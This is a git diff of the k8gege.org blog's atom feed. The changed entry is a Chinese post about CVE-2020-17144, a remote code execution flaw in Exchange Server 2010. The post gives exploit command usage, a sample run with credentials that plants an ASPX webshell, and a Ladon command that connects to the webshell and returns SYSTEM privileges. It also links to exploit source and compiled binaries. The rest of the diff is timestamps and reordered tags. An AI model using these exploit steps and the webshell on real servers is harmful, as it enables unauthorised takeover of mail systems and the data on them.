@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2020-12-09T17:22:44.686Z</updated>
+  <updated>2020-12-09T17:29:42.050Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="http://k8gege.org/p/CVE-2020-17144.html"/>
     <id>http://k8gege.org/p/CVE-2020-17144.html</id>
     <published>2020-12-09T16:50:00.000Z</published>
-    <updated>2020-12-09T17:22:44.686Z</updated>
+    <updated>2020-12-09T17:29:42.050Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>漏洞是由程序未正确校验cmdlet参数引起。经过身份验证的攻击者利用该漏洞可实现远程代码执行。</p><p>该漏洞和 CVE-2020-0688 类似，也需要登录后才能利用，不过在利用时无需明文密码，只要具备 NTHash 即可。除了常规邮件服务与 OWA外，EWS接口也提供了利用所需的方法。漏洞的功能点本身还具备持久化功能。</p><p>参考 <a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17144" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17144</a></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 31</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>C:\Users\k8gege&gt;CVE-2020-17144.exe 192.168.1.89 administrator K8gege520<br>BinaryFormatter<br>[+] Target: <a href="https://192.168.1.89/ews/Exchange.asmx" target="_blank" rel="noopener">https://192.168.1.89/ews/Exchange.asmx</a><br>[+] User: administrator K8gege520<br>[+] Shell in <a href="https://192.168.1.89/autodiscover/Services.aspx" target="_blank" rel="noopener">https://192.168.1.89/autodiscover/Services.aspx</a>, Wait for few minutes</p><h3 id="连接webshell"><a href="#连接webshell" class="headerlink" title="连接webshell"></a>连接webshell</h3><p>C:\Users\k8gege&gt;Ladon WebShell aspx cd <a href="https://192.168.1.89/autodiscover/Services.aspx" target="_blank" rel="noopener">https://192.168.1.89/autodiscover/Services.aspx</a> Ladon whoami</p><p>Load WebShellExec</p><p>nt authority\system</p><p><img alt="image" data-original="http://k8gege.org/k8img/posts/CVE-2020-17114.png"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>Src: <a href="https://github.com/Airboi/CVE-2020-17144-EXP" target="_blank" rel="noopener">https://github.com/Airboi/CVE-2020-17144-EXP</a><br>Bin: <a href="https://github.com/k8gege/K8tools" target="_blank" rel="noopener">https://github.com/k8gege/K8tools</a> 编译好的</p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
+    <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>漏洞是由程序未正确校验cmdlet参数引起。经过身份验证的攻击者利用该漏洞可实现远程代码执行。</p><p>该漏洞和 CVE-2020-0688 类似，也需要登录后才能利用，不过在利用时无需明文密码，只要具备 NTHash 即可。除了常规邮件服务与 OWA外，EWS接口也提供了利用所需的方法。漏洞的功能点本身还具备持久化功能。</p><p>参考 <a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17144" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17144</a></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 31</p><h3 id="EXP用法"><a href="#EXP用法" class="headerlink" title="EXP用法"></a>EXP用法</h3><p><a href="https://github.com/Airboi/CVE-2020-17144-EXP" target="_blank" rel="noopener">https://github.com/Airboi/CVE-2020-17144-EXP</a></p><p>条件: Exchange2010; 普通用户<br>默认用法(写webshell): CVE-2020-17144-EXP.exe mail.example.com user pass</p><p>执行命令 &amp; 端口复用: 修改ExploitClass.cs</p><p>参考 @zcgonvh <a href="https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&amp;mid=2247483712&amp;idx=1&amp;sn=0b2cc3c9692f5c58a4eeb246d4b392fc&amp;chksm=eaa5bb60ddd23276baf4cfd3fc59ca847c28f350c65ef98a17d49bc9944d653fad95dec4fd14&amp;mpshare=1&amp;scene=1&amp;srcid=1209jtbQLVJIgr3VT0Ut1TM9&amp;sharer_sharetime=1607483575995&amp;sharer_shareid=dc9cecc79ba34e4bbb700a43a16153fd#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&amp;mid=2247483712&amp;idx=1&amp;sn=0b2cc3c9692f5c58a4eeb246d4b392fc&amp;chksm=eaa5bb60ddd23276baf4cfd3fc59ca847c28f350c65ef98a17d49bc9944d653fad95dec4fd14&amp;mpshare=1&amp;scene=1&amp;srcid=1209jtbQLVJIgr3VT0Ut1TM9&amp;sharer_sharetime=1607483575995&amp;sharer_shareid=dc9cecc79ba34e4bbb700a43a16153fd#rd</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>C:\Users\k8gege&gt;CVE-2020-17144.exe 192.168.1.89 administrator K8gege520<br>BinaryFormatter<br>[+] Target: <a href="https://192.168.1.89/ews/Exchange.asmx" target="_blank" rel="noopener">https://192.168.1.89/ews/Exchange.asmx</a><br>[+] User: administrator K8gege520<br>[+] Shell in <a href="https://192.168.1.89/autodiscover/Services.aspx" target="_blank" rel="noopener">https://192.168.1.89/autodiscover/Services.aspx</a>, Wait for few minutes</p><h3 id="连接webshell"><a href="#连接webshell" class="headerlink" title="连接webshell"></a>连接webshell</h3><p>C:\Users\k8gege&gt;Ladon WebShell aspx cd <a href="https://192.168.1.89/autodiscover/Services.aspx" target="_blank" rel="noopener">https://192.168.1.89/autodiscover/Services.aspx</a> Ladon whoami</p><p>Load WebShellExec</p><p>nt authority\system</p><p><img alt="image" data-original="http://k8gege.org/k8img/posts/CVE-2020-17114.png"></p><h3 id="DownLoad"><a href="#DownLoad" class="headerlink" title="DownLoad"></a>DownLoad</h3><p>编译好的EXP: <a href="https://github.com/k8gege/K8tools" target="_blank" rel="noopener">https://github.com/k8gege/K8tools</a></p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
     
     <summary type="html">
     
@@ -188,14 +188,14 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
     </summary>
     
     
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
       <category term="工具" scheme="http://k8gege.org/categories/Tool/"/>
     
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
-      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
   </entry>
   
@@ -600,18 +600,18 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
     </summary>
     
     
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
       <category term="工具" scheme="http://k8gege.org/categories/Tool/"/>
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
       <category term="密码" scheme="http://k8gege.org/categories/Pass/"/>
     
       <category term="嗅探" scheme="http://k8gege.org/categories/Sniffer/"/>
     
     
-      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
-    
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
       <category term="Sniffer" scheme="http://k8gege.org/tags/Sniffer/"/>
     
